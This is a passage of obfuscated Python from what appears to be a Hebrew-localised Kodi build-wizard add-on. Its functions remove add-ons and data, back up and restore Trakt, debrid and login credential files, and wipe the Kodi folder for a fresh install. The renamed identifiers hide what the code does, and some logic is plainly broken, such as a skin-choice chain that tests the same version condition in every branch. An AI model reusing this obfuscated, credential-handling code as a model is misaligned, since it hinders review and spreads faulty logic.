		O0OOO0OO0OO000O00 =os .path .join (ADDONS ,OOOOOOOO00OO0O00O )#line:4611
		wiz .log ("Removing Addon %s"%OOOOOOOO00OO0O00O )#line:4612
		wiz .cleanHouse (O0OOO0OO0OO000O00 )#line:4613
		xbmc .sleep (1000 )#line:4614
		try :shutil .rmtree (O0OOO0OO0OO000O00 )#line:4615
		except Exception as O0O0O0000OO000OOO :wiz .log ("Error removing %s"%OOOOOOOO00OO0O00O ,xbmc .LOGNOTICE )#line:4616
		removeAddonData (OOOOOOOO00OO0O00O ,O00O0O0O0OO00OOO0 ,over )#line:4617
	if over ==False :#line:4618
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]%s Removed[/COLOR]"%(COLOR2 ,O00O0O0O0OO00OOO0 ))#line:4619
def removeAddonData (OO00OO0OOO00000OO ,name =None ,over =False ):#line:4621
	if OO00OO0OOO00000OO =='all':#line:4622
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4623
			wiz .cleanHouse (ADDOND )#line:4624
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4625
	elif OO00OO0OOO00000OO =='uninstalled':#line:4626
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] addon data stored in you Userdata folder for uninstalled addons?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4627
			OO00O000O000OO0O0 =0 #line:4628
			for O0OO0O000O00O000O in glob .glob (os .path .join (ADDOND ,'*')):#line:4629
				O00O000O00OOO0000 =O0OO0O000O00O000O .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:4630
				if O00O000O00OOO0000 in EXCLUDES :pass #line:4631
				elif os .path .exists (os .path .join (ADDONS ,O00O000O00OOO0000 )):pass #line:4632
				else :wiz .cleanHouse (O0OO0O000O00O000O );OO00O000O000OO0O0 +=1 ;wiz .log (O0OO0O000O00O000O );shutil .rmtree (O0OO0O000O00O000O )#line:4633
			wiz .LogNotify ('[COLOR %s]Clean up Uninstalled[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OO00O000O000OO0O0 ))#line:4634
		else :wiz .LogNotify ('[COLOR %s]Remove Addon Data[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4635
	elif OO00OO0OOO00000OO =='empty':#line:4636
		if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to remove [COLOR %s]ALL[/COLOR] empty addon data folders in you Userdata folder?[/COLOR]'%(COLOR2 ,COLOR1 ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4637
			OO00O000O000OO0O0 =wiz .emptyfolder (ADDOND )#line:4638
			wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]%s Folders(s) Removed[/COLOR]'%(COLOR2 ,OO00O000O000OO0O0 ))#line:4639
		else :wiz .LogNotify ('[COLOR %s]Remove Empty Folders[/COLOR]'%COLOR1 ,'[COLOR %s]Cancelled![/COLOR]'%COLOR2 )#line:4640
	else :#line:4641
		O000O0O0OOOOOOO00 =os .path .join (USERDATA ,'addon_data',OO00OO0OOO00000OO )#line:4642
		if OO00OO0OOO00000OO in EXCLUDES :#line:4643
			wiz .LogNotify ("[COLOR %s]Protected Plugin[/COLOR]"%COLOR1 ,"[COLOR %s]Not allowed to remove Addon_Data[/COLOR]"%COLOR2 )#line:4644
		elif os .path .exists (O000O0O0OOOOOOO00 ):#line:4645
			if DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you also like to remove the addon data for:[/COLOR]'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,OO00OO0OOO00000OO ),yeslabel ='[B][COLOR green]Remove Data[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]'):#line:4646
				wiz .cleanHouse (O000O0O0OOOOOOO00 )#line:4647
				try :#line:4648
					shutil .rmtree (O000O0O0OOOOOOO00 )#line:4649
				except :#line:4650
					wiz .log ("Error deleting: %s"%O000O0O0OOOOOOO00 )#line:4651
			else :#line:4652
				wiz .log ('Addon data for %s was not removed'%OO00OO0OOO00000OO )#line:4653
	wiz .refresh ()#line:4654
def restoreit (O00OOO0OO000OO000 ):#line:4656
	if O00OOO0OO000OO000 =='build':#line:4657
		OOO00OO0OOO00OOOO =freshStart ('restore')#line:4658
		if OOO00OO0OOO00OOOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Local Restore Cancelled[/COLOR]"%COLOR2 );return #line:4659
	if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary']:#line:4660
		wiz .skinToDefault ()#line:4661
	wiz .restoreLocal (O00OOO0OO000OO000 )#line:4662
def restoreextit (OOO0OO00O000OOO00 ):#line:4664
	if OOO0OO00O000OOO00 =='build':#line:4665
		O00O0000O0OO0OOO0 =freshStart ('restore')#line:4666
		if O00O0000O0OO0OOO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]External Restore Cancelled[/COLOR]"%COLOR2 );return #line:4667
	wiz .restoreExternal (OOO0OO00O000OOO00 )#line:4668
def buildInfo (OOOO0OO00O0000OOO ):#line:4670
	if wiz .workingURL (SPEEDFILE )==True :#line:4671
		if wiz .checkBuild (OOOO0OO00O0000OOO ,'url'):#line:4672
			OOOO0OO00O0000OOO ,O00O0OOO0O0O0OOO0 ,O0O0O0O0O0O0O0000 ,O000OOO00OO000OO0 ,O0000OO00OO0OO00O ,O0OOOOO0O0O0O000O ,OO0OOO0OO0OOO0OOO ,OO00OO00OO0O00O0O ,OOOO0O0OO0OO00O0O ,O00O0O0OO0OOOOOOO ,O000OO0OO0OO0O000 =wiz .checkBuild (OOOO0OO00O0000OOO ,'all')#line:4673
			O00O0O0OO0OOOOOOO ='Yes'if O00O0O0OO0OOOOOOO .lower ()=='yes'else 'No'#line:4674
			OOO00OO000000OOO0 ="[COLOR %s]שם הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,OOOO0OO00O0000OOO )#line:4675
			OOO00OO000000OOO0 +="[COLOR %s]גירסת הבילד:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00O0OOO0O0O0OOO0 )#line:4676
			if not O0OOOOO0O0O0O000O =="http://":#line:4677
				O00O00O00O00OOOOO =wiz .themeCount (OOOO0OO00O0000OOO ,False )#line:4678
				OOO00OO000000OOO0 +="[COLOR %s]Build Theme(s):[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,', '.join (O00O00O00O00OOOOO ))#line:4679
			OOO00OO000000OOO0 +="[COLOR %s]קודי גירסה:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O0000OO00OO0OO00O )#line:4680
			OOO00OO000000OOO0 +="[COLOR %s]Adult Content:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O00O0O0OO0OOOOOOO )#line:4681
			OOO00OO000000OOO0 +="[COLOR %s]תאור:[/COLOR] [COLOR %s]%s[/COLOR][CR]"%(COLOR2 ,COLOR1 ,O000OO0OO0OO0O000 )#line:4682
			wiz .TextBox (ADDONTITLE ,OOO00OO000000OOO0 )#line:4683
		else :wiz .log ("Invalid Build Name!")#line:4684
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4685
def buildVideo (O000O0OO00000O0O0 ):#line:4687
	wiz .log ("DDDDDDDDDDDDDDDDDDDDDDDDD: %s"%wiz .workingURL (SPEEDFILE ))#line:4688
	if wiz .workingURL (SPEEDFILE )==True :#line:4689
		OOOO00000OO0OOO00 =wiz .checkBuild (O000O0OO00000O0O0 ,'preview')#line:4690
		wiz .log ("FFFFFFFFFFFFFFFFFFFFFFFFFF: %s"%O000O0OO00000O0O0 )#line:4691
		if OOOO00000OO0OOO00 and not OOOO00000OO0OOO00 =='http://':playVideo (OOOO00000OO0OOO00 )#line:4692
		else :wiz .log ("[%s]Unable to find url for video preview"%O000O0OO00000O0O0 )#line:4693
	else :wiz .log ("Build text file not working: %s"%WORKINGURL )#line:4694
def dependsList (O00O0OOO00O0OO0OO ):#line:4696
	OOOOOO0O000OOOOOO =os .path .join (ADDONS ,O00O0OOO00O0OO0OO ,'addon.xml')#line:4697
	if os .path .exists (OOOOOO0O000OOOOOO ):#line:4698
		O0000O0O0OO0O0OOO =open (OOOOOO0O000OOOOOO ,mode ='r');O00OOO00OO00OOO0O =O0000O0O0OO0O0OOO .read ();O0000O0O0OO0O0OOO .close ();#line:4699
		OOOOOOOO00O00O0OO =wiz .parseDOM (O00OOO00OO00OOO0O ,'import',ret ='addon')#line:4700
		OO000000OO0OO00O0 =[]#line:4701
		for O0000O00OOO00O000 in OOOOOOOO00O00O0OO :#line:4702
			if not 'xbmc.python'in O0000O00OOO00O000 :#line:4703
				OO000000OO0OO00O0 .append (O0000O00OOO00O000 )#line:4704
		return OO000000OO0OO00O0 #line:4705
	return []#line:4706
def manageSaveData (OO00000O0O0O0000O ):#line:4708
	if OO00000O0O0O0000O =='import':#line:4709
		O00OOO0OO0OOO00O0 =os .path .join (ADDONDATA ,'temp')#line:4710
		if not os .path .exists (O00OOO0OO0OOO00O0 ):os .makedirs (O00OOO0OO0OOO00O0 )#line:4711
		O000O00OOO00O0000 =DIALOG .browse (1 ,'[COLOR %s]Select the location of the SaveData.zip[/COLOR]'%COLOR2 ,'files','.zip',False ,False ,HOME )#line:4712
		if not O000O00OOO00O0000 .endswith ('.zip'):#line:4713
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Import Data Error![/COLOR]"%(COLOR2 ))#line:4714
			return #line:4715
		OOO0O0OO00OOOOOO0 =os .path .join (MYBUILDS ,'SaveData.zip')#line:4716
		O0000O0OO0OOOOOO0 =xbmcvfs .copy (O000O00OOO00O0000 ,OOO0O0OO00OOOOOO0 )#line:4717
		wiz .log ("%s"%str (O0000O0OO0OOOOOO0 ))#line:4718
		extract .all (xbmc .translatePath (OOO0O0OO00OOOOOO0 ),O00OOO0OO0OOO00O0 )#line:4719
		OO0OO0OO00O0000O0 =os .path .join (O00OOO0OO0OOO00O0 ,'trakt')#line:4720
		O0O00OO00OO0O00O0 =os .path .join (O00OOO0OO0OOO00O0 ,'login')#line:4721
		OO000000000O0OO0O =os .path .join (O00OOO0OO0OOO00O0 ,'debrid')#line:4722
		O0OO00000000OO0OO =0 #line:4723
		if os .path .exists (OO0OO0OO00O0000O0 ):#line:4724
			O0OO00000000OO0OO +=1 #line:4725
			O0OOOOO0O0OO0O0OO =os .listdir (OO0OO0OO00O0000O0 )#line:4726
			if not os .path .exists (traktit .TRAKTFOLD ):os .makedirs (traktit .TRAKTFOLD )#line:4727
			for OO0OO0O0O00000000 in O0OOOOO0O0OO0O0OO :#line:4728
				OOOOOOOOOO0OO00O0 =os .path .join (traktit .TRAKTFOLD ,OO0OO0O0O00000000 )#line:4729
				OOOOO0O0O000OO000 =os .path .join (OO0OO0OO00O0000O0 ,OO0OO0O0O00000000 )#line:4730
				if os .path .exists (OOOOOOOOOO0OO00O0 ):#line:4731
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO0OO0O0O00000000 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4732
					else :os .remove (OOOOOOOOOO0OO00O0 )#line:4733
				shutil .copy (OOOOO0O0O000OO000 ,OOOOOOOOOO0OO00O0 )#line:4734
			traktit .importlist ('all')#line:4735
			traktit .traktIt ('restore','all')#line:4736
		if os .path .exists (O0O00OO00OO0O00O0 ):#line:4737
			O0OO00000000OO0OO +=1 #line:4738
			O0OOOOO0O0OO0O0OO =os .listdir (O0O00OO00OO0O00O0 )#line:4739
			if not os .path .exists (loginit .LOGINFOLD ):os .makedirs (loginit .LOGINFOLD )#line:4740
			for OO0OO0O0O00000000 in O0OOOOO0O0OO0O0OO :#line:4741
				OOOOOOOOOO0OO00O0 =os .path .join (loginit .LOGINFOLD ,OO0OO0O0O00000000 )#line:4742
				OOOOO0O0O000OO000 =os .path .join (O0O00OO00OO0O00O0 ,OO0OO0O0O00000000 )#line:4743
				if os .path .exists (OOOOOOOOOO0OO00O0 ):#line:4744
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO0OO0O0O00000000 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4745
					else :os .remove (OOOOOOOOOO0OO00O0 )#line:4746
				shutil .copy (OOOOO0O0O000OO000 ,OOOOOOOOOO0OO00O0 )#line:4747
			loginit .importlist ('all')#line:4748
			loginit .loginIt ('restore','all')#line:4749
		if os .path .exists (OO000000000O0OO0O ):#line:4750
			O0OO00000000OO0OO +=1 #line:4751
			O0OOOOO0O0OO0O0OO =os .listdir (OO000000000O0OO0O )#line:4752
			if not os .path .exists (debridit .REALFOLD ):os .makedirs (debridit .REALFOLD )#line:4753
			for OO0OO0O0O00000000 in O0OOOOO0O0OO0O0OO :#line:4754
				OOOOOOOOOO0OO00O0 =os .path .join (debridit .REALFOLD ,OO0OO0O0O00000000 )#line:4755
				OOOOO0O0O000OO000 =os .path .join (OO000000000O0OO0O ,OO0OO0O0O00000000 )#line:4756
				if os .path .exists (OOOOOOOOOO0OO00O0 ):#line:4757
					if not DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like replace the current [COLOR %s]%s[/COLOR] file?"%(COLOR2 ,COLOR1 ,OO0OO0O0O00000000 ),yeslabel ="[B][COLOR green]Yes Replace[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):continue #line:4758
					else :os .remove (OOOOOOOOOO0OO00O0 )#line:4759
				shutil .copy (OOOOO0O0O000OO000 ,OOOOOOOOOO0OO00O0 )#line:4760
			debridit .importlist ('all')#line:4761
			debridit .debridIt ('restore','all')#line:4762
		wiz .cleanHouse (O00OOO0OO0OOO00O0 )#line:4763
		wiz .removeFolder (O00OOO0OO0OOO00O0 )#line:4764
		os .remove (OOO0O0OO00OOOOOO0 )#line:4765
		if O0OO00000000OO0OO ==0 :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Failed[/COLOR]"%COLOR2 )#line:4766
		else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Save Data Import Complete[/COLOR]"%COLOR2 )#line:4767
	elif OO00000O0O0O0000O =='export':#line:4768
		O000O00000000OO0O =xbmc .translatePath (MYBUILDS )#line:4769
		OOOO0O0O0O00OO00O =[traktit .TRAKTFOLD ,debridit .REALFOLD ,loginit .LOGINFOLD ]#line:4770
		traktit .traktIt ('update','all')#line:4771
		loginit .loginIt ('update','all')#line:4772
		debridit .debridIt ('update','all')#line:4773
		O000O00OOO00O0000 =DIALOG .browse (3 ,'[COLOR %s]Select where you wish to export the savedata zip?[/COLOR]'%COLOR2 ,'files','',False ,True ,HOME )#line:4774
		O000O00OOO00O0000 =xbmc .translatePath (O000O00OOO00O0000 )#line:4775
		OO0OO0O0OOOO000O0 =os .path .join (O000O00000000OO0O ,'SaveData.zip')#line:4776
		OOOO000000000O000 =zipfile .ZipFile (OO0OO0O0OOOO000O0 ,mode ='w')#line:4777
		for O00OOOOOOOOOOOO0O in OOOO0O0O0O00OO00O :#line:4778
			if os .path .exists (O00OOOOOOOOOOOO0O ):#line:4779
				O0OOOOO0O0OO0O0OO =os .listdir (O00OOOOOOOOOOOO0O )#line:4780
				for OO0O0O00OOO0O000O in O0OOOOO0O0OO0O0OO :#line:4781
					OOOO000000000O000 .write (os .path .join (O00OOOOOOOOOOOO0O ,OO0O0O00OOO0O000O ),os .path .join (O00OOOOOOOOOOOO0O ,OO0O0O00OOO0O000O ).replace (ADDONDATA ,''),zipfile .ZIP_DEFLATED )#line:4782
		OOOO000000000O000 .close ()#line:4783
		if O000O00OOO00O0000 ==O000O00000000OO0O :#line:4784
			DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OO0O0OOOO000O0 ))#line:4785
		else :#line:4786
			try :#line:4787
				xbmcvfs .copy (OO0OO0O0OOOO000O0 ,os .path .join (O000O00OOO00O0000 ,'SaveData.zip'))#line:4788
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,os .path .join (O000O00OOO00O0000 ,'SaveData.zip')))#line:4789
			except :#line:4790
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]Save data has been backed up to:[/COLOR]"%(COLOR2 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0OO0O0OOOO000O0 ))#line:4791
def freshStart (install =None ,over =False ):#line:4796
	if USERNAME =='':#line:4797
		ADDON .openSettings ()#line:4798
		sys .exit ()#line:4799
	O0OOO00OO0O00O000 =u_list (SPEEDFILE )#line:4800
	(O0OOO00OO0O00O000 )#line:4801
	O000OOOOO000O0O00 =(wiz .workingURL (O0OOO00OO0O00O000 ))#line:4802
	(O000OOOOO000O0O00 )#line:4803
	if KEEPTRAKT =='true':#line:4804
		traktit .autoUpdate ('all')#line:4805
		wiz .setS ('traktlastsave',str (THREEDAYS ))#line:4806
	if KEEPREAL =='true':#line:4807
		debridit .autoUpdate ('all')#line:4808
		wiz .setS ('debridlastsave',str (THREEDAYS ))#line:4809
	if KEEPLOGIN =='true':#line:4810
		loginit .autoUpdate ('all')#line:4811
		wiz .setS ('loginlastsave',str (THREEDAYS ))#line:4812
	if over ==True :OOOO0OO0O0000OO0O =1 #line:4813
	elif install =='restore':OOOO0OO0O0000OO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]בחרת לשחזר את הבילד מקובץ גיבוי קודם"%COLOR2 ,"האם להמשיך?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4814
	elif install :OOOO0OO0O0000OO0O =1 #line:4815
	else :OOOO0OO0O0000OO0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]התקנת הבילד"%COLOR2 ,"קודי אנונימוס?[/COLOR]",nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:4816
	if OOOO0OO0O0000OO0O :#line:4817
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4818
			O0O0OO00OOO000OO0 ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.anonymous.mod'if KODIV <17 else 'skin.estouchy'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.anonymous.nox'if KODIV <17 else 'skin.Premium.mod'#line:4819
			skinSwitch .swapSkins (O0O0OO00OOO000OO0 )#line:4822
			OOOO00OO0O000O0O0 =0 #line:4823
			xbmc .sleep (1000 )#line:4824
			while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and OOOO00OO0O000O0O0 <150 :#line:4825
				OOOO00OO0O000O0O0 +=1 #line:4826
				xbmc .sleep (1000 )#line:4827
				wiz .ebi ('SendAction(Select)')#line:4828
			if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:4829
				wiz .ebi ('SendClick(11)')#line:4830
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Timed Out![/COLOR]'%COLOR2 );return False #line:4831
			xbmc .sleep (1000 )#line:4832
		if not wiz .currSkin ()in ['skin.confluence','skin.estouchy','skin.estuary','skin.anonymous.mod','skin.anonymous.nox','skin.phenomenal','skin.Premium.mod']:#line:4833
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: Skin Swap Failed![/COLOR]'%COLOR2 )#line:4834
			return #line:4835
		wiz .addonUpdates ('set')#line:4836
		OO0000OO00O000O00 =os .path .abspath (HOME )#line:4837
		DP .create (ADDONTITLE ,"[COLOR %s]מחשב קבצים ותיקיות"%COLOR2 ,'','אנא המתן![/COLOR]')#line:4838
		O00O00O000OO00000 =sum ([len (O0O0O00O0O00000OO )for OO0OOO0OO00OO000O ,O0O00OO0OO00000OO ,O0O0O00O0O00000OO in os .walk (OO0000OO00O000O00 )]);O0000O00O0O000OO0 =0 #line:4839
		DP .update (0 ,"[COLOR %s]Gathering Excludes list."%COLOR2 )#line:4840
		EXCLUDES .append ('My_Builds')#line:4841
		EXCLUDES .append ('archive_cache')#line:4842
		EXCLUDES .append ('script.module.requests')#line:4843
		EXCLUDES .append ('myfav.anon')#line:4844
		if KEEPREPOS =='true':#line:4845
			O000O00O00OO0O0O0 =glob .glob (os .path .join (ADDONS ,'repo*/'))#line:4846
			for O00000OOOOOOO0OO0 in O000O00O00OO0O0O0 :#line:4847
				OOO0000O0OO0O0O00 =os .path .split (O00000OOOOOOO0OO0 [:-1 ])[1 ]#line:4848
				if not OOO0000O0OO0O0O00 ==EXCLUDES :#line:4849
					EXCLUDES .append (OOO0000O0OO0O0O00 )#line:4850
		if KEEPSUPER =='true':#line:4851
			EXCLUDES .append ('plugin.program.super.favourites')#line:4852
		if KEEPMOVIELIST =='true':#line:4853
			EXCLUDES .append ('plugin.video.metalliq')#line:4854
		if KEEPMOVIELIST =='true':#line:4855
			EXCLUDES .append ('plugin.video.anonymous.wall')#line:4856
		if KEEPADDONS =='true':#line:4857
			EXCLUDES .append ('addons')#line:4858
		EXCLUDES .append ('plugin.video.elementum')#line:4863
		EXCLUDES .append ('script.elementum.burst')#line:4864
		EXCLUDES .append ('script.elementum.burst-master')#line:4865
		EXCLUDES .append ('plugin.video.quasar')#line:4866
		EXCLUDES .append ('script.quasar.burst')#line:4867
		EXCLUDES .append ('skin.estuary')#line:4868
		if KEEPWHITELIST =='true':#line:4871
			O00O00O00O0OO0OOO =''#line:4872
			O000O00000O0000O0 =wiz .whiteList ('read')#line:4873
			if len (O000O00000O0000O0 )>0 :#line:4874
				for O00000OOOOOOO0OO0 in O000O00000O0000O0 :#line:4875
					try :O00OOO0OOO000O00O ,OO00O000OO00OO00O ,O0O00O000000000O0 =O00000OOOOOOO0OO0 #line:4876
					except :pass #line:4877
					if O0O00O000000000O0 .startswith ('pvr'):O00O00O00O0OO0OOO =OO00O000OO00OO00O #line:4878
					OO0O00O0O000OO00O =dependsList (O0O00O000000000O0 )#line:4879
					for OOO0OOO00OO0OO0O0 in OO0O00O0O000OO00O :#line:4880
						if not OOO0OOO00OO0OO0O0 in EXCLUDES :#line:4881
							EXCLUDES .append (OOO0OOO00OO0OO0O0 )#line:4882
						O0000000OOOO0OO0O =dependsList (OOO0OOO00OO0OO0O0 )#line:4883
						for O0O0000OOOO0O00O0 in O0000000OOOO0OO0O :#line:4884
							if not O0O0000OOOO0O00O0 in EXCLUDES :#line:4885
								EXCLUDES .append (O0O0000OOOO0O00O0 )#line:4886
					if not O0O00O000000000O0 in EXCLUDES :#line:4887
						EXCLUDES .append (O0O00O000000000O0 )#line:4888
				if not O00O00O00O0OO0OOO =='':wiz .setS ('pvrclient',O0O00O000000000O0 )#line:4889
		if wiz .getS ('pvrclient')=='':#line:4890
			for O00000OOOOOOO0OO0 in EXCLUDES :#line:4891
				if O00000OOOOOOO0OO0 .startswith ('pvr'):#line:4892
					wiz .setS ('pvrclient',O00000OOOOOOO0OO0 )#line:4893
		DP .update (0 ,"[COLOR %s]מנקה קבצים ותיקיות:"%COLOR2 )#line:4894
		OO0O0OO0O0O000000 =wiz .latestDB ('Addons')#line:4895
		for O0OOOO0000OOO0OO0 ,O0O0OOO0O00000O00 ,OO00000OO0O0000O0 in os .walk (OO0000OO00O000O00 ,topdown =True ):#line:4896
			O0O0OOO0O00000O00 [:]=[OOOO0OOOO0O0OO00O for OOOO0OOOO0O0OO00O in O0O0OOO0O00000O00 if OOOO0OOOO0O0OO00O not in EXCLUDES ]#line:4897
			for O00OOO0OOO000O00O in OO00000OO0O0000O0 :#line:4898
				O0000O00O0O000OO0 +=1 #line:4899
				O0O00O000000000O0 =O0OOOO0000OOO0OO0 .replace ('/','\\').split ('\\')#line:4900
				OOOO00OO0O000O0O0 =len (O0O00O000000000O0 )-1 #line:4902
				if O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'script.skinshortcuts'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPSKIN =='true':wiz .log ("Keep Skin: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4903
				elif O00OOO0OOO000O00O =='MyVideos99.db'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4904
				elif O00OOO0OOO000O00O =='MyVideos107.db'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4905
				elif O00OOO0OOO000O00O =='MyVideos116.db'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -0 ]=='Database'and KEEPMOVIEWALL =='true':wiz .log ("Keep Movie Wall: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4906
				elif O00OOO0OOO000O00O =='MyVideos99.db'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4907
				elif O00OOO0OOO000O00O =='MyVideos107.db'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4908
				elif O00OOO0OOO000O00O =='MyVideos116.db'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -0 ]=='Database'and KEEPMOVIELIST =='true':wiz .log ("Keep Movie List: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4909
				elif O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'plugin.video.anonymous.wall'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPMOVIELIST =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4910
				elif O0O00O000000000O0 [OOOO00OO0O000O0O0 -2 ]=='userdata'and O0O00O000000000O0 [OOOO00OO0O000O0O0 -1 ]=='addon_data'and 'skin.anonymous.mod'in O0O00O000000000O0 [OOOO00OO0O000O0O0 ]and KEEPVIEW =='true':wiz .log ("Keep View: %s"%os .path .join (O0OOOO0000OOO0OO0 ,O00OOO0OOO000O00O ),xbmc .LOGNOTICE )#line:4911
